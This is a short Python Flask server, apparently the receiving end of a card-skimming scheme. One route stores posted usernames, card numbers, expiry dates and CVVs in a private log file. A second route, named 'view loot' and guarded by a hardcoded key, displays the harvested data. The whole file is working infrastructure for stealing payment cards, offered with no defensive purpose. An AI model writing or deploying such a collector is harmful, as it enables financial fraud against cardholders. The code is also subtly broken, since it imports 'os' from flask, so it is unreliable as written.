from flask import Flask, request, os

app = Flask(__name__)
DB_FILE = "log_privado.txt"

@app.route('/guardar', methods=['POST'])
def guardar():
    data = request.get_json()
    if data:
        with open(DB_FILE, "a") as f:
            f.write(f"U: {data.get('user')} | C: {data.get('card')} | E: {data.get('exp')} | V: {data.get('cvv')}\n")
    return {"status": "ok"}, 200

@app.route('/ver_botin')
def ver_botin():
    if request.args.get('clave') != "33197878": return "Forbidden", 403
    if not os.path.exists(DB_FILE): return "Vacio."
    with open(DB_FILE, "r") as f: return f"<pre>{f.read()}</pre>"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
